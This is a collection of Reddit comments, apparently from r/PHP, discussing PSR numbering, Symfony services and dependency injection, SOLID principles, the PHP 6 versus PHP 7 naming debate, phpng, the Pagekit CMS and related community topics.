[^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cj3b1j9)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Perhaps if you actually tell people what it is you're trying to do, rather than just abstract examples, you might get some more helpful suggestions.
[React](http://reactphp.org/).
Each PSR stands as its own document and is not necessarily related to any previous PSR. A specific PSR may update, deprecate or replace other PSRs (eg. PSR-4 basically replaces PSR-0), but the hierarchy is not numeric. It works the same as RFCs - each document can be about something completely different, but may refer to, update or deprecate previous documents.
Numbers create an easy-to-use reference system. It's a fairly standard system that's already well known and used by other standards such as RFCs. It does avoid potential naming issues - for example, using your system PSR-6 may be referred to as 'PSR-http', but then if another HTTP related PSR is released, it would have to be something like 'PSR-http-2' . However this brings about ambiguity: is this PSR specific to 'http/2.0' or is it the second PSR regarding http?
Go back to these forums, with the intention of listening, learning and eventually, finding mistakes; as always, consider everything you read until you understand it, or see the flaws in it clearly ... *everybody* makes mistakes, it doesn't take long to go from someone who is intimidated by titles to someone finding mistakes in content. On the subject of material to learn from; where the material comes from doesn't matter at all. If you approach everything as I describe, then reading a nonsense source of information is as useful as reading a good, reliable source of information. A well developed bullshit detector, with the supporting database of facts that accompany it, is probably the best tool in our kit ...
Yes, but this does not answer my question.
Okay, thank you very much. It feels odd for example to make a service that is only being called in one single location. But maybe it'll be reused. So I guess let's service all the things :)
I actually tend to get more frustrated by people simply not answering the question that is asked. I sometimes ask a specific question that leaves out the bigger picture because it's too complicated to explain, or because I know that in explaining it, people will start offering solutions that are not useful because I missed some subtlety in my explanation. That all said, now that OP has opened it up to ask for different solutions in this thread, I would suggest looking into [MySQL Triggers](http://dev.mysql.com/doc/refman/5.0/en/triggers.html) to see if they would provide a better solution.
Thanks for that, a great suggestion, I was on the fence about making it a lib but will be doing that for the next release.
The reason for full paths is because the relative links break when you're traversing around your project and running git commands from my experience. I'm looking at making a setup script to add/replace the projects pre-commit file, which could accept relative paths.
Thanks for the reply. Yes sorry that was a typo I meant Redis. I'm not sure if Wordpress can use it either; I'm just researching all the possible ways to optimize Wordpress (i.e use MariaDB instead of MySQL, using Varnish, tuning Ubuntu server, nginx, etc.). If anybody has other suggestions about what to look into I'd love to hear. 
Yes! I tried to make it as VCS agnostic as possible. You'd have to implement a `getMercurialStagedFiles` method in `Helper.php` and make sure the file status matches in `File.php` but that's about it. I don't use Mercurial myself but feel free to submit a pull request!
I'm actually using [oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh) with the avit theme.
Rain doesn't fall from the sky. I just wanted to voice that :)
silex or https://github.com/odino/exphpress
Googled for "online flow-chart" and it came up with http://gliffy.com. Pretty good site.
If you need to suppress warnings to accomplish something, you're doing it wrong. After all, that's why it generates a warning. 
&gt; Don't assume everybody buys books and knows what PHP6 was. Don't assume because you do not buy books, or read anything outside official docs that no one buys books or reads online tutorials &gt;In the end the version number doesn't really matter I guess They matter when using reference materials like Books..... Which is the entire point of this discussion. 
And updated.
Algonquin College Ottawa Ontario Web Development^† … I don't remember what year it was maybe 3-4 ago. She's on vacation, but I can take a picture of the book when they're back. Anyways, it's pretty stupid that a course suggested the book, but it was a good laugh when I found it. *^† Course name speculative, it was a short course, maybe a year.* 
changed 
thats reeeeeally smart, thanks im beginning 2 realise the level in the audience...
They're right, though. Suppressing warnings should be a note to you that you're doing something very bad. It's giving you a warning. You can be snide about it all you like. I'd fail the fuck out of this on any code review it came through, and so would 95% of other programmers. There is maybe the faintest tiniest sliver of justification for using `@` in an extremely rare case. This isn't it. It's just sloppy and unnecessary.
That's good to hear.
no?
This appears to be correct. When reading each PSR (0-2) they EXPLICITLY state that it requires you to follow the PSR previous. However, PSR-3 does NOT state this.
I always found the blueprint metaphor quite bad for explaining what a class is..
Never be afraid to admit you don't know. You won't ever know every single minor thing about software engineering, continue asking questions and you'll eventually feel like you know enough to 'fit in'. It just takes time, I've been doing it for over 8 years and still feel like I have loads to learn. It's a continuous learning experience. 
I'm not sure what to say here. I'm always torn with articles like this. The writer is obviously not speaking English as a first language, so some degree of awkwardness is inevitable. But in articles like this, when posted to a primarily English-speaking audience, the clumsy phrasing makes the content hard to follow. This is even more of a problem when the content itself is not... stellar. 
It's not *unclear*. It's fucking terrible. Bad practise is bad. Are you getting this? This is sloppy, nasty code. It's not clever. It's poor.
IMHO, Symfony is a *Service* Oriented Framework. So, I think that you should write everything using services. While `new MyService` works, it is up to you to manager more complex scenarios: $mailer = new \Swift_Mailer; $logger = new Monolog\Monolog; ... $myService = new MyService($mailer, $logger, ...); So, I think that the right question should be: why *not* use Services?
Using `new MyService()` will cause the caller to be tightly coupled with your MyService class, whereas `$container-&gt;get('my.service')` won't. If you ever need to refactor `MyService` and break it into different parts, or maybe rename the class, you'd have to change all references to it. If you use it as a service, you could refactor the service, break it into multiple parts, rename the classes... and still not alter whatever other classes call it. `new MyService` **always** creats coupling, which is something you *probably* want to avoid.
Very cool and useful tool, thanks for sharing! Now, who wants to host a public plugin repository?
I think he's saying you're not following the Dependency Inversion practice by hard-coding references to your service.
I was able to register, create, and save the flow chart. There might be some costs for advanced features but I didn't need anything special.
Lots of projects have skipped versions. MariaDB, which many use instead of mySQL, skipped 5 versions!
I am going to get bashed for this, but PHP is not the tool for this job. PHP isn't meant to be a daemon or to run forever (or every second). Look to Python or even Java.
I don't want to sound mean, but was this translated with a Google Translate? It's just a pain in the ass to understand, and I'm saying this as someone who knows the topic at hand.
Well. The question actually was WHAT to consider a service
What you speak of does not only concern the Dependency Inversion Principle, but also the Liskov Substitution Principle and the Open/Closed Principle as well. Let's start off with the Open/Closed Principle. The principle states that an entity should be open for extension, but closed for modification. What this means is that you shouldn't have to go into a class and rewrite its code to provide a new implementation (which might have been brought on by changed requirements, for instance), but rather extend the class or implement an interface in order to achieve polymorphism. Next we have the Liskov Substitution Principle which states that objects in a program should be substitutable with instances of their subtypes or interfaces without affecting the application's correctness. What this means is that you should be able to replace objects with different instances providing different implementation (and potentially behaviour) without breaking the application or otherwise causing it to act unexpectedly. Finally, we have the Dependency Inversion Principle which states that you should depend on abstractions, not concretions. What this means is that you should never tightly couple your code against specific implementations since that'd make it difficult to introduce change into the application, but instead depend on abstractions such as an interface, thereby allowing for different implementations to be provided. The most common way of solving DIP is by Dependency Injection, which means that you assign a specific implementation via a setter whose signature expects an implementation of an interface, e.g.: public function setUserRepository(UserRepositoryInterface $userRepository) { $this-&gt;userRepository = $userRepository; } These principles, along with the Single Responsibility Principle and the Interface Segregation Principle make up SOLID, the five basic principles of object-oriented programming and design, formulated with the intention of helping you to create a system which is easier to maintain and extend over time. 
Cool. Was würdest du für ihn haben wollen? 
Yes I will make everything a service from now on. I feared overhead but learned that the overhead is insignificant. 
But why was the vote cancelled?
The fact that you depend only on abstractions is the point. Also, it doesn't have to be an interface. It could be an abstract class or a service id. The point is that controllers for instance don't instantiate services or don't define dependencies on concrete implementations. You would have something like __construct(AbstractFileHandler, DatabaseHandlerInterface) instead of __construct(WindowsFileHandler, MySQLHandler)
lol
Thanks for that, totally agree with you, will look at making the changes to better support other version control systems.
This is really fascinating work, I commend your efforts.
 $linkId = mysqli_real_escape_string($connect, $_POST["linkId"]); $query = mysqli_query($connect, "DELETE FROM links WHERE linkId = '$linkId' LIMIT 1") or die(mysqli_error()); Really?
Portokosten in Bitcoin :) PM die Adresse und er geht diese Woche noch auf die Reise...
Firebug, to my knowledge, works for both. But IMO chrome's console is better. If you want something that is it's own application, I don't see the need for it.
Yeah, do that and I'm on board for sure.
Interesting....do you have an opinion on which version of PHP gives the best performance? Have you tried the newest?
It's cool. I was kinda thinking this would be what most people would suggest. I just don't know Java or anything about making a daemon. Since it's a small project, I was just looking for a solution in a language I already know. 
Firebug != FirePHP. FirePHP only works with Firebug on Firefox.
Well, that's part of the reason to find a console debugger that works cross-browser: so we don't have to force a browser for specific development. Sticking to one library also means less maintaing and centralized logging methods. Using multiple libraries will end up requiring a translation logging library; each library I mentioned has different levels of support and variations in parameters. 
**sadly** common :(
Method chaining is not a good reason to clutter return types of operations. That is going to be damaging functionality and introducing bugs for the sake of aesthetics, which are of no use in first place.
Same here. Once it can be integrated into my existing projects I'm all over this.
There is [FirePhp for Chrome](https://chrome.google.com/webstore/detail/firephp4chrome/gpgbmonepdpnacijbbdijfbecmgoojma). Last time I checked, it worked somewhat, but I am used to FireBug in Firefox, and haven't played much with the Chrome equivalent.
The inversion is not a complete inversion. Consider a case where object A invokes a method on object B Without an interface: A -&gt; B A invokes B (control flows left-&gt;right) A depends on B (has to know about B) With an interface: A-&gt; B^i &lt;-B A is invoking a method on B still, but the dependency between B^i and B is flowing in the opposite direction
When designing a library I don't usually know what my user's preference is. For the ones that like method chaining I return $this. The ones that don't like method chaining don't have to do it. I don't see it as cluttering, but more as a way to cater to various types of audiences.
Hah, I completely misunderstood what you were asking for :p I thought this was in the webdev subreddit, not the php one. My bad. I can only suggest reporting errors into a log and checking that way instead, but that's pretty tedious and cumbersome.
Is there a live demo anywhere? How's this different than say Bolt?
Thanks. I appreciate it.
I hate to say it (especially here) but I am mostly dropping PHP in favour of Python using Flask. It is faster and a pure pleasure to program. So for a moment I was all happy because of Facebook's HHVM but now I have moved on mentally. So most of my servers are 5.4 with one still on 5.3. I have read good things from people who have been playing with 5.6 though. One speed thing that I have never deployed was nginx, which most hard core speed people swear by. But the Python thing is not a matter of speed, but that there are other backend data mashing things that I also do that then fit well with the web stuff. But I wouldn't go so far as to tell other pure web people to dump PHP. I am not one of the people who craps all over it as some kind of kiddy language. To me it is an excellent tool for web programming and if used properly makes excellent things. But like every other language when used improperly makes crap. 
/r/PHP is not a support subreddit, and this doesn't have anything to do with PHP. Try /r/webdev.
Interesting project. Not sure if you are the author, but if you are, why not work with the Symfony CMF project instead of starting from scratch?
Looks like he is farther ahead then the CMF! 
Yes this. I don't understand the unique selling point of this.
Report back!
I've got 5 years of experience with no degree; With only a year left I must recommend finishing it. There's things such as a TN visa that'll you be missing out on the opportunity of being able to apply for without finishing.
[Here is the documentation.](http://pagekit.com/docs/quickstart) I absolutely hate that I have to sign up just to find this.
PSR-1 doesn't inherit from anything. 1 and 2 are style guides, 0 and 4 are autoloaders.
Symfony CMF is really weird.. People ask me sometimes why we don't use this for our CMS, and the only answer I can give them is that the CMF is a product looking for a problem to solve, when it should be the other way around.. It is terribly over-engineered, and it's promoting decoupling for the sake of decoupling. 
I'm obviously biased, but I'm curious about this too. Why require a signup, when you're promoting Open Source at the same time? I wonder if they're just doing this to monitor interest, or if it's going to be a business model like Craft has? They say the CMS is Open Source, and then sell indispensable extensions for a hefty fee. 
&gt; I absolutely hate that I have to sign up just to find this. About &gt; Developers &gt; "marketplace documentation" is the shortest non-signup route I found 
Not the author - just saw this on Hacker News and figured it would be of interest here. We'd actually evaluated CMF for an unrelated client project and came to the same conclusiong as /u/bopp
Thank you for not using the word "Beautiful" to describe your product on the website.
And what happens when his site gets over his server's directory file limit in new users? Then it's off to invent a new solution.
I am sorry If I am misunderstanding you. I was not trying to misrepresent your points, only trying to answer as best as I understood. But, I still think you're very wrong. &gt; it's Drupal-flavored PSR-5 because Drupal is too big to completely change how it documents its API, and it dilutes the interoperability of the standard. I liken it to someone creating a tabs-flavored PSR-2. 1. PSR-5 does not need to include every single annotation that Drupal would like to use for it to be a valid standard. 2. Drupal does not need to add every single annotation they use to PSR-5 to be able to use it. 3. A tabs flavored PSR-2 would not be possible, as that would violate PSR-2. It would be more like Drupal taking PSR-2 as a base for their style guide, then adding some opinions about how to use short tags or something else that PSR-2 doesn't cover. They tried to add in a few tags, then Mikey took some of them on board and explained why he would not take a few others. I am the coordinator of PSR-5. I've been keeping an eye on it. &gt; Drupal had multiple core contributors bumping and steering discussions about the package-oriented autoloader, which I think greatly contributed to PSR-4's relatively quick adoption They really didn't. Larry was involved in the conversation and made some great additions, but nobody else from Drupal swung by and nobody was bumping or steering the conversation other than me and Paul. I was the coordinator on that PSR-4. I was more than keeping an eye on it. &gt; even after it almost died on the vine after the first failed vote. It never nearly died on the vine. I cancelled the vote because people had privately raised some concerns that they hadn't raised publicly, and I was unable to let the vote continue without sorting that out first. It had great support the first time, and the second time. I am not really trying to make any point and this isn't an argument, you're just representing a few situations very differently from how I remember them happening, and I was RIGHT there when they all happened, and highly involved.
PSR-1 and PSR-2 both have dependencies on the PSRs before them. That is not how things work in general, and is something we will try to avoid in the future. Dependencies are shit for standards.
It should be noted that this won't be php5.7 but either php6 or php7 based on the outcome of this RFC: https://wiki.php.net/rfc/php6
Super easy to compile and install on any linux box (not sure how on windows). Let me know if anyone wants instructions.
This is what "major" version indicates. Otherwise it would be "next minor version" :) &lt;http://semver.org&gt;
This is the most moronic thing I have ever read in this sub.
How fast is it?
This looks pretty great. Is there a things the review checks for?
Some dickhead edited the RFC to bias it toward PHP 7 then everyone lost their shit and cancelled the vote. Just fucking call it PHP 6 already.
This.
Yes, yes, yes :) If the test coverage is there and it can be made to pass - would be great to see.
&gt; If we had PSR-autoloading and PSR-autoloadingagain it would be ridiculous. I was talking about using "PSR-autoload-v1" and "PSR-autoload-v2". But maybe that's too cumbersome. Your HTML example is completely spurious and those build on the previous one. Maybe a better idea would be PSR-001, PSR-002 etc. That way they don't sound quite as "versioned".
&gt; Or read any of a hundred "current" articles on google after searching "php 6". ...and in a shocking gut check, any official release (which could be as simple as PHP 6.1.0) we'll see that be the predominant result in every single search engine. The first result NOW is from wiki.php.net about this very topic. Second result, broken link. Third result about this topic, etc.
They're going to re-write the RFC and put it up for vote again, but there has been no timeframe set. Yet.
Succinct, plus cursing!
This will be the best thing that has happened for PHP I really hope they release the 6/7.0 as soon as reasonably possible too and not try to fold in even newer things into it, save that for the .1 .2, etc releases (including retiring mysql_*) Just think of the power savings around the world, considering all the servers that run PHP 24/7 - even if it is not 50% power savings, just 10% more efficient power use would add up.
I'm not entirely sure of everything that those consoles do, but there's [php debugbar](http://phpdebugbar.com/) that seems to work fine in most browsers. You can log stuff to it in PHP, output SQL, catch exceptions, and it refreshes automatically w/ ajax requests.
The goals behind CMF is to be completely decoupled in a way that each of their bundles can be used independantly (For example: anybody can use their RoutingBundle if they wanted to load routes from a database). That is probably why it feels over engineered. I was curious if Pagekit had some technical reasons, otherwise this just feels like an outcome of the NIH Syndrome, just like Razr, a templating language also by Pagekit.
One common bug with virtualbox itself is that if you do not disable Sendfile in Apache / Nginx you can have this issue. Otherwise, NFS is a bit slow at updating (I'm not sure what you are using, vbfs is the default). Newer versions of Vagrant have an rsync option that works pretty well, but you need to open up a terminal and run an rsync watch command.
I've talked about green programming in the past, people gave me funny looks. 
The same thing that generally happens to PHP. Internals got into a pissing match.
I say drop the number scheme all together and call it 'Threshold'. (I'm kidding. I've been reading about the WinRT/WP merger... I read this post with interest because honestly I'm curious myself where its going. Calling the new php threshold just made me laugh for some reason. I think I'm over tired.) 
I still want Unicode or UTF-8 support language-wide. ...dammit.
This is a terrible, cheap copy of the real elePHPants. Blech.
&gt; And calling anyone at Zend names (assuming Zeev did it) Zeev *admitted* to doing it, so no assumption is necessary. &gt; is very wrong considering how much Zend has done for PHP Considering *a lot* of the wtfs in PHP were authored by Zend employees, they don't get my symphaty in this discussion, *especially* zeev as he is once again acting like "my way or the high way" and people are understandbly upset.
These are cheap copies, not the real elePHPants. I'm sick of explaining this, and nobody seems to understand why it's wrong. 1. The elePHPant graphic, and the derived toy design is copyright to it's creator. 2. The elePHPant graphic itself is *freely* given to the community 3. The folks who hold the copyright — while difficult to communicate with, partially due to language barriers — have been pretty awesome to the community, especially to PHPWomen These folks, and the official elePHPant are as much a part of our community the elePHPants have grown to represent as any one else — Zend, Rasmus, Derick, /u/ircmaxell, /u/krakjoe, /u/nikic, etc. We should support them, not be dicks by buying these "cheap" knockoffs. Buy your elePHPants from php[arch] (I'm sure they will have some orange ones on sale soon), or PHPWomen (we will definitely have some purples ones on sale towards the end of the year), or attend ZendCon, or ForumPHP (Paris, in French). Hell, reach out to the community itself, there are plenty of people with spares who are either willing to let you buy it, trade it, or even just gift it.
I do it all for *you*.
Every time I see a project like this, they always seem to be coupled with a templating engine based off blade with a similarly sharp name... Why not just use blade?
Wow, the website looks really good and the CMS looks really interesting.
Or "gorgeous." Did he use "gorgeous"?
As I see the situation, Zeev made an in-good-faith edit to try and make the case for PHP7 clearer, altho it was made after voting had started. In doing so, it was perceived that he had removed some of the case for PHP6 (altho as I read the modifications, he just moved the same information around). Andrea (the original author of the RFC) then cancelled the vote (even tho nobody had actually voted yet) and has yet to restart it. Andrea then appears to comment on Twitter that he disliked the RFC anyway as the case for PHP7 was already too strong even before Zeev's edits. References: * https://twitter.com/SaraMG/status/490923477860614145 * https://wiki.php.net/rfc/php6?do=revisions Personal opinion: The entire situation is stupid. As is quite clear from the RFC, even before Zeev's edits, there are far too many reasons to skip 6 and use 7, and no real reasons against doing so. As far as I've seen, while purely anecdotal, from conversations I've read there are actually very few people on internals in favor of going with PHP6 - there's just a small bunch of holdouts who seem to insist on keeping this issue alive instead of getting on with more important issues like the roadmap to PHP-Next.
Merging of phpng to master is a whole different issue, and in my opinion is one only the core developers can sort out amongst themselves as they're really the only people affected by it. Personally, I think the wrong question has been asked. From the performance improvements I've seen, and the fact that no one has any better propositions for improving performance, the question should not be "should phpng be merged", but "when should phpng be merged". It's my opinion that while the phpng may still leave a lot to be desired in terms of cleanup and documentation, these appear to be ongoing issues that have been around since the PHP4 =&gt; PHP5 transition, and are in my opinion a separate "project". As I see it, they could merge phpng as soon as it's ready, then either create a new branch or work directly in master on cleanup and documentation. This would allow the other major work that's currently being blocked to continue at the same time as cleanup. The other major question raised is the timeline for PHP-Next. While zeev and some other Zend developers seem to think it should be relatively short, there's a counter-voice saying that it needs to be longer to ensure they have time to get things in a good position for potentially a decades worth of development. As a user I would much rather them take the time to get things right, even if that means we see no real new features for 2 years. I also feel that trying to tackle the question of timelines without even a loose roadmap / idea of what will actually go into PHP-Next is a little bit silly. But as I said in the first paragraph, my opinion is mute as I don't actually work on the core code, so it doesn't affect me.
It's my opinion that this RFC asks the wrong question. It's quite clear from the discussion around it, and the fact that I've seen no counter-proposals that offer the same performance improvements to PHP, that phpng is almost certainly going to be the base for PHP-Next. The question should be "what are the criteria for merging". ie. how clean, well documented, etc. does the branch need to be. The big problem as I see it is currently everyone is basically waiting for phpng to be merged before they start major work on PHP-Next. I also think that discussions should be concentrating much more on the roadmap / what's going to go into PHP-Next, rather than trying to fathom timelines. There seems to be a large calling for a cleanup of the PHP codebase in terms of internal APIs and documentation. My personal opinion would be that this work is a separate project from the performance project that is phpng, and as such should not be criteria for phpng being merged.
The entire point of a major version change is to allow for breaking of backwards compatibility and other major changes. Performance is not everything, and even if it is, failing to take the time now to perform cleanup and documentation, and make other major changes such as the 64-bit improvements, could leave PHP-Next in a really bad place. Rushing out a .0 of PHP-Next only to then make major changes a few months later in .1 is just asking for trouble. If you make all the major changes in one clean hit, exactly where they're expected to be made, you'll make life much easier for the developers who work on and have to upgrade PHP applications, and I believe you're a lot less likely to end up with the horrible long transition times that were issues with 5.3. If you want to take the "green computing" angle, while you may make savings immediately, you could easily lose out in the long run because additional savings made by other changes that were supposed to go into .0 and instead went into .1, .2, etc releases are not realised as quickly because people refuse to migrate to them because they don't want to, are not able to (because their hosting refuses to make yet another major version upgrade) or are not given the time (by their management) to make the changes ("What? But we just gave you time to do a major version upgrade a couple of months ago? No. We need this new feature yesterday!").
Actually, I would love to see mysql_* retired with the new major. Would finally get people upgrading off codebases that still used that. Otherwise I bet your bottom dollar they'll upgrade to 7.0.x, and then if 7.1 removed them, continually demand new 7.0.x bugfix releases for time immemorial.
&gt; there are far too many reasons to skip 6 and use 7 No there really aren't. PHP with a version number of 6 **was never released**. The RFC claims PHP 6 existed, yet this blatantly false. There was never a PHP6 tag and untagged == unreleased. Simple as that. And then there are ***completely retarded*** reasons, like these: * 7 is perceived as a lucky number in both the Western world and Chinese culture. * Version 6 is generally associated with failure in the world of dynamic languages. WTF? *Seriously?* Then again, these are the same people [who put **My Little Pony**](http://i.imgur.com/bJAR5Y2.png) on the front page of a programming language, so I'm not really surprised. 
looking good... but MY GOD why another template engine
&gt; Well there is Symfony in the name ... IMHO most Symfony components are well engineered. It boggles me that the CMF people somehow got the "pseudo official" status, because I don't think Symfony's core devs have anything to do with it. &gt; I would say having a CMF which you can integrate in your Symfony (and any PHP) application instead of hacking a Wordpress in it is a valid goal. You can do this in a lot of different ways other than having to resort to hacking WP. :-) 
A bit late, but the docs are also here (without sign up required): https://github.com/pagekit/docs
While PHP6 stable was never released in stable form, it [existed as a branch in the repository](http://blog.ulf-wendel.de/2007/php-mysqlnd-checked-in-to-php-6-head/) (granted it has since been deleted, so it no longer appears, but it still existed). It exists as discussions archived on the mailing lists, discussions on sites like stack overflow, articles on the web and books on Amazon. To say the PHP6 doesn't exist, and to try to reuse that version number is simply asking for trouble. It will cause many support issues. It will cause grievance for users who are trying to find out information about PHP-Next. I would wager it could even cause adoption problems, maybe not on the scale of Perl 6, but possibly on the scale of Python 3. As a user and community member none of this is what I want to see happen to PHP. While I admit those 2 specific reasons (lucky number and 'version 6 failure') are not the most solid (and were likely added mostly for amusement), ignoring those 2 reasons there is plenty of reason to skip straight to 7.
Interesting, I wonder if this will catch on again. It seems almost too late considering many web hosting companies have already upgraded to PHP 5.4 without it.
/r/phphelp
http://redbeanphp.com/
Updated it a little and added it to GitHub https://github.com/HelgeSverre/Domain-Availability 
How'd you go about it?
This book covers a lot specific to PHP and PHP-FPM. I've noticed PHP developers can go far too long into their career without learning server stuff (Since it "just works" so well on most setups!)
So `composer require sjparkinson/static-review:dev-development --prefer-source` should now include a setup script. The following should add a symlink to your projects `.git/hooks/pre-commit`, if there isn't already something there. $ vendor/bin/static-review.php --hook example-pre-commit 
Datacenters use a whole bunch of power. Even people who don't want to be "green" can just save some "green" in their wallet (well "green" if in us, lol) WordPress.com for example uses 2200 servers. Imagine if they could cut that to 1500.
I really don't get the mysql_* hate. Benchmark after benchmark shows in the realworld, none of the newer methods are any faster at all. It is not like the code to support them has to be constantly maintained, it is already folded into mysqlnd and stable/done. 
That's an elaborate scheme to annoy people
Name it "Hack" so it's incredibly easy to get unrelated search results.
The blue ones are [the originals](http://www.elephpant.com/) (~~hilarious~~ many errors on there). Then there was a green for ZF, pink for Symfony?, orange for laravel and phpArchitect, etc. The phpWomen one will be purple. Edit: hilarity removed until further notice
The irony of reading an article about securing your PHP installation on a site running wordpress.
blah blah blah wrong subreddit check here blah blah but based on your code, line 5 should be $result = $my_db-&gt;query("SELECT * FROM table WHERE tag = "hello"); Not sure what the $exeQuery variable is supposed to be but without seeing where that's defined, you should be able to get away with just a simple query.
But using a framework might get OP's product to market, and if there's a need to scale and a business model, s/he could then refactor to remove the framework, and use Composer packages instead?
But dude, it's not OOP! &lt;/snark&gt;
If we're gonna use roman numerals it may as well jump straight to version 490.
It sounds like what you're trying to do is some sort of database abstraction library. If only there was some other way to do that....
This is excellent, thanks for posting! Great motivation for those of us who are also striving for insanely fast apps at scale. One critical thing to note about this article is that this application is serving API requests, not full page requests. Typically once all of the low hanging optimization fruit has been picked (memcached/Redis, load balancing, etc), the slowest component of a page will be rendering the view. That's not to take away from the staggering 30ms average request time, but let's compare apples to apples. TL;DR who knew Symfony2 could be fast!? Not me :)
Can you give me some advice on how to do this? I often create small web apps with areas that would need my client to edit the content, but hate to write a backend just for that
thought it was an awesome read too. Regarding view caching...I haven't messed around with it but Symfony does have a concept of fragments and ESI. You can in fact cache rendered bits of your application. [Relevant tutorial](https://knpuniversity.com/screencast/new-symfony-2.2/fragments-esi-caching) 
yeah i don't think it's reasonable to expect any php app, regardless of framework, to handle that much traffic without the aid of other technologies
thats an interesting summary of the situation... The "dickhead" was Zeev Suraski who already told Andrea previously that he would like to co-author the rfc to represent the PHP7 side. Andrea said that it is ok but [asked](https://www.mail-archive.com/internals@lists.php.net/msg67634.html) to be kept up-to-date. 2 weeks passed, Andrea started the vote without Zeev finding the time to update the php7 side, he [asked](https://www.mail-archive.com/internals@lists.php.net/msg68045.html) Andrea to stop the vote so he can update the rfc, didn't got a reply in time, so he went ahead and added some rationale to the PHP7 side and sent a headsup to the thread. Andrea first seemed okay with the update, but then people started pointing out how the php7 section is much bigger (and some people also had some problems with the quality of the text for both sides), turned out that part of the php6 rationale was [removed](https://wiki.php.net/rfc/php6?do=diff&amp;rev2%5B0%5D=1405812347&amp;rev2%5B1%5D=1405836411&amp;difftype=sidebyside) because up till Zeev's edit that was the only thing describing the version 7 as an alternative and why Andrea thinks it isn't really a good option. Zeev removed that as he added the separate block for version 7 and he thought it would be already redundant. After that the block was restored, but Andrea [halted](http://www.mail-archive.com/internals@lists.php.net/msg68063.html) the vote, on the ground of the php6 side not being represented properly vs version 7.
Welcome to Web 2.0 and Responsive Design. Bend over.
If you want to integrate it into an existing app, you can add `bolt/bolt` as a composer dependency now: https://packagist.org/packages/bolt/bolt After doing this, you can use the whatever parts of the CMS you wish to use. In your templates you'd need to add a few tags or controllers to fetch content from the DB, but this isn't rocket science. Alternatively, you could use the Sonata admin bundle: http://sonata-project.org/bundles/admin/master/doc/index.html
PHP6 haven't had a branch, but it was developed in the trunk (this is why it was "blocking" progress, because it couldn't be released before the advertized feature set including the unicode support is completed), which was later renamed to experimental/first_unicode_implementation after the decision was made to put that aside and focus on other ideas for a next minor version.
It didn't stop authors trying to jump the trend and release books about it though. Personally, I think a break in sequentiality is better than causing confusion (I'd be pissed if I bought a book only to find it was about a version that was never released, rather than the current version). As long as the numbers increment, then it's fine.
Some rambling notes from a possible setup. I don't use the gettext PHP extension with Apache. It caches thing and forces you to restart the webserver if you want the translations to be up-to-date. See this [stackoverflow](http://stackoverflow.com/questions/7931021/gettext-caching-annoyance) I did on this matter. Another solution you will see is to copy the file each time the modification time changes. This is why I like to use plain old PHP array files instead. * I use a custom __() function in all my.php files to wrap all the translations. * Then I use the xgettext binary to extract the translations from the PHP source code. I get a .po file from this process. * I convert it as PHP array using [PoParser](https://github.com/raulferras/PHP-po-parser) * This allows me to fill in the translations I already have as PHP array in my sofware by merging them. This is needed for all the languages. * I convert those PHP array back to .po files to feed them into [Pootle](http://pootle.translatehouse.org/), a translation platform. * Once it's translated, I can get the .po files back, convert them in PHP array with PoParser and commit them in my project. For JavaScript, use a JSON file generated from the PHP array. PO-Parser allows you to read the comments on a string, so you will be able to only copy the translations you need in the JSON file. The plural form is handled by the __() function (depending on the locale). The same wrapper is available in JavaScript.
Some might argue that that using a translate function is like using globals and is cheating, and that you should inject a translation object into every class where you might want to translate something. I would like to see a discussion on that.
&gt; Googling php6 now points to the current thing known as php6, and will continue to for a while No it wont. The rolling search indexes very quickly throw out old information in favor of newer information that shares the same search space, provided there is enough interlinking and activity surrounding it (which there will be). The several months of news and updates about ACTUAL PHP 6 development leading up to its release alone would be enough to wipe away all of the old information. It's not like PHP 6 is coming out tomorrow and there will suddenly be a huge mountain of outdated information that will be competing with new documentation. It's borderline pure insanity to base a naming convention around the behavior of Google's search algorithm. Fucking call it PHP 6, and don't give all of the Python, Java, and Ruby assholes yet another absurd reason to criticize PHP ("LOL THEY CAN'T EVEN KEEP THEIR VERSION NUMBERS STRAIGHT"). Skipping 6 and going straight to 7 is stupid.
I don't know why you're being downvoted. Those two are indeed completely retarded reasons and non-arguments. If I asked someone in an interview why they think the next release of PHP should be versioned at 7 and they gave me those reasons, I would show them the door....
&gt; ignoring those 2 reasons there is plenty of reason to skip straight to 7. Care to elaborate?
Which popular php app were you thinking of that has a secure track record?
That sounds awful. I'd use a dependency injector before that cruft.
Of? You also don't get pretty formatted results. You should ever have debugging turned on on your production system. You still need a mechanism to trigger it, that isn't apparent to the general user or attackable by hackers.
In my experience, NFS is quite fast.
That's an interesting option. I'll keep an eye on that. Thanks.
You just summed it up. Reasons to call it 6: avoiding trolls (not a real reason) Reasons to call it 7: search indexes pointing to the wrong info (a real reason, however short lived)
Oops double post. 
I love reading about this type of stuff. One of the top 150 websites on the internet is also using Symfony2 to power it. The lead engineer of the team had a talk about it a couple years ago. It's good stuff.
From the article: &gt;We totally rejected the Doctrine ORM as it would add an overhead and we just don’t need any advanced Object-style manipulations. Instead we use pure Doctrine DBAL with its features: and &gt;As the application serves as a REST API, we mainly don’t use Templating (like Twig). We keep it only for some internal dashboard panels. I find it hard to see this as a legitimate benchmark considering two of the major components of an MVC framework aren't even used. I'm sure similar achievements could be made with any other major MVC framework when no ORM or template rendering occur. Not saying that symfony is slow, just that I seriously doubt an actual symfony app which leverages twig and Doctrine would achieve 700 req/s
Has my vote +1
I don't think this is meant to be a **Here's why Symfony is the best framework** article but more of a **Here's what we are able to achieve with Symfony and how**. There's no claim here that a Symfony app that uses twig and Doctrine's ORM would achieve 700 req/s... 
The TLDR version: &gt; Tools don't matter as much as how you use them
right, just wanted to highlight as not everyone reads articles.
Obviously not gonna happen unless we have a plush version of it.
Technically, that wouldn't be violating semver, as the major did increase. It would be against the spirit, and weird, but it would work...
LOL. I see what you did there.
Quick! Someone start a Kickstarter!
&gt;and even their excrement can be dried and burned as fuel! Uh yeah... Hmm.
Ship it.
Indeed. Since MindGeek (formally Manwin) owns both YouPorn and PornHub, I wouldn't doubt if PornHub is also running Symfony2 or is built in PHP. I could be wrong though. I left the adult industry last year, so I haven't followed much on the tech side in a while.
Bingo.
